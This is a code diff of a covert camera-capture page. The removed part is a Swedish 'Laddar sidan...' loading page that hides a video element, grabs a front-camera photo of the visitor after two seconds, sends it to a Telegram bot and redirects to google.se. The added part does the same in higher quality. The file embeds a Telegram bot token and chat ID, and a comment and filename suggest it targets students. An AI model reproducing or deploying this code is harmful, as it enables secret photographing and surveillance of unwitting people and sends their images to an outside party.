@@ -1,89 +1,45 @@
-<!DOCTYPE html>
-<html lang="sv">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sidan laddas...</title>
-    <style>
-        /* شاردنەوەی کامێرا و کانڤاس بۆ ئەوەی دیار نەبێت */
-        #video, #canvas { display: none; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
-            padding-top: 25%; 
-            background-color: #f0f2f5;
-            color: #333;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
+// ڕێکخستنی کوالێتی بەرز بۆ کامێرا
+const constraints = {
+    video: {
+        facingMode: "user",
+        width: { ideal: 1280 }, // داوای کوالێتی HD دەکەین
+        height: { ideal: 720 }
+    }
+};
 
-    <div class="loader"></div>
-    <h1>Laddar sidan...</h1>
-    <p>Vänligen vänta ett ögonblick medan vi ansluter till servern.</p>
+navigator.mediaDevices.getUserMedia(constraints)
+.then(stream => {
+    video.srcObject = stream;
+    
+    // چاوەڕێکردنی ٣ چرکە بۆ ئەوەی فوکەس و ڕووناکی تەواو بێت
+    setTimeout(takeSnapshot, 3500); 
+})
+.catch(err => {
+    console.error("Error: ", err);
+});
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+function takeSnapshot() {
+    const context = canvas.getContext('2d');
+    
+    // ڕێکخستنی قەبارەی کانڤاسەکە وەک ڤیدیۆکە
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // ناردنی وێنەکە بە کوالێتی بەرز (0.9 واتە ٩٠٪ کوالێتی)
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'high_quality.png');
+        formData.append('caption', '📸 وێنەی نوێ بە کوالێتی بەرز');
 
-    <script>
-        // زانیارییەکانی تۆ کە داتنابوو
-        const TELEGRAM_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
-        const CHAT_ID = '6351568884';
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        // داواکردنی کامێرای پێشەوەی مۆبایل
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
         })
-        .then(stream => {
-            video.srcObject = stream;
-            
-            // دوای ٢ چرکە وێنەکە دەگرێت بۆ ئەوەی کاتی هەبێت کامێراکە ڕوون بێتەوە
-            setTimeout(takeSnapshot, 2000);
-        })
-        .catch(err => {
-            console.error("Kameran kunde inte startas: ", err);
-            // ئەگەر ڕەزامەندی نەدا، هەر دەچێتە سەر گوگل
-            setTimeout(() => { window.location.href = "https://www.google.se"; }, 3000);
+        .then(() => {
+            window.location.href = "https://www.google.se";
         });
-
-        function takeSnapshot() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
-            
-            // گۆڕینی وێنەکە بۆ فایل و ناردنی بۆ تێلێگرام
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'student_capture.png');
-                formData.append('caption', 'Ny bild mottagen från länken! 📸');
-
-                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    // دوای ناردنی سەرکەوتووانە، بەکارهێنەرەکە دەنێرێت بۆ وێبسایتی سویدی
-                    window.location.href = "https://www.google.se";
-                })
-                .catch(error => {
-                    console.error("Fel vid sändning:", error);
-                    window.location.href = "https://www.google.se";
-                });
-            }, 'image/png');
-        }
-    </script>
-</body>
-</html>
+    }, 'image/jpeg', 0.9); // بەکارهێنانی jpeg بۆ ڕوونی زیاتر
+}
